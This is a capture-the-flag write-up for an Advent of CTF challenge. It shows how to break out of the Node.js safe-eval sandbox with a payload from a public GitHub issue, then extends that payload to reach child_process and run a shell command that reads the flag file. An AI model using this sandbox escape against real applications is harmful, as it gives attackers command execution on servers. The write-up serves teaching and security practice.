@@ -1,0 +1,53 @@
+#+TITLE: Advent of CTF - Challenge 19
+#+SUBTITLE: "Safe?"
+
+* Challenge
+
+This challenge builds on the previous one. The elves upgraded the application with a module to make it safe again.
+
+What you will learn:
+
+- Bypassing the =safe-eval= module
+
+* Solution
+:PROPERTIES:
+:ATTACH_DIR: /home/arjen/Projects/credmp.github.io/writeups/advent-of-ctf/challenge-19/index_att
+:END:
+
+The introduction of this challenge is in [[./../challenge-18/index.org]]. It starts the same, but you will notice that you can not call any function or standard Javascript objects. Entering any /wrong/ data will give an error message, clearly showing the use of the =safe-eval= module. 
+
+#+CAPTION: Identify safe-eval
+[[file:index_att/identify-safe-eval.png]]
+
+Looking at the [[https://github.com/hacksparrow/safe-eval][Github]] page for the project you might notice a currently *open* [[https://github.com/hacksparrow/safe-eval/issues/16#issuecomment-554301596][issue]] that states that the safe-eval can still be escaped.
+
+[[file:index_att/github-20201220.png]]
+
+The issue describes a payload that can be used to "exploit" the issue. In this case it will only return a process, but not do anything yet.
+
+#+CAPTION: The payload from the issue
+#+begin_src javascript
+(
+    delete(this.constructor.constructor),delete(this.constructor),
+    this.constructor.constructor("return process")()
+)
+#+end_src
+
+Building on it and with some NodeJS payload knowledge/research a new payload can be constructed. 
+
+#+CAPTION: Building on the payload
+#+begin_src javascript
+(
+    delete(this.constructor.constructor),
+    delete(this.constructor), 
+    this.constructor.constructor('return process')()
+        .mainModule.require('child_process')
+        .execSync('cat flag.txt').toString()
+)
+#+end_src
+
+When you have your points, don't forget to grab the badge!
+
+[[./index_att/badge.png]]
+
+Go back to the [[../../../index.org][homepage]].
